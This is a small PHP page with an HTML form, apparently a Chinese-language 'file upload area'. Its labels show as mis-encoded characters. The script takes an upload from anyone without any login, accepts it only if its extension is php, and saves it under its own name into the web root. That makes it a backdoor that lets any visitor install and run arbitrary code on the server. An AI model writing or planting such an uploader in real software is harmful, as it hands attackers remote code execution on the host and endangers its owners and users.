<?php
header("Cache-Control: no-cache, must-revalidate");
header("Pragma: no-cache");
header("Content-Type:text/html;charset=GB2312");
if(isset($_POST['abc']))
{
	$uploaddir='./';
	$uploadfile=$uploaddir.basename($_FILES['upfile']['name']);
//	if(file_exists($uploadfile))
//		unlink($uploadfile);

	if(array_pop(explode('.',basename($_FILES['upfile']['name'])))=='php')
	{
		if(move_uploaded_file($_FILES['upfile']['tmp_name'],$uploadfile))
		{
			echo '<script type="text/javascript">alert(\'�ļ�',basename($_FILES['upfile']['name']),'�ϴ��ɹ�!\');</script>';
		}
	}else
					echo '<script type="text/javascript">alert(\'��ҳ��ֻ�����ϴ�php�ļ�!\');</script>';
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>�ļ��ϴ�ר��</title>
</head>
<BODY>
<form name="forml" method="POST" action="" enctype="multipart/form-data">
<div align="center">
  <center>
<table  width="420" height="300" width="90%" cellSpacing="1" cellPadding="0">
<tr>
	<td align="center" colspan="5"><br><span class="TitleColor"><font size=4>�ļ��ϴ�ר��(�ϴ����������ϵͳ��Ŀ¼)</span><br><br></td>
</tr>
<tr>
	<td colspan=5><br><font size=4>��ѡ�񱾴��ϴ��ļ�:<input name="abc" value="0" type="hidden"><input name="upfile" type="file" size="42"></td>
</tr>
<tr>
	<td colspan=5 align=center><br><a href="javascript:sub()"><font size=4><b>ȷ���ϴ�</a>&nbsp;&nbsp;&nbsp;&nbsp;</td>
</tr>
</table>
</center>
</div>
</form>
</body>
</html>
<script type="text/javascript">
function openwindow(url,width1,height1,left1,top1)
{
	left1=(window.screen.availWidth-width1)/2;
	top1=(window.screen.availHeight-height1)/2;
	var Win = window.open(url,'','width='+width1+',height='+height1+',left='+left1+',top='+top1+',resizable=0,menubar=no,status=no');
}
function sub()
{
		window.forml.submit();
}
</script>
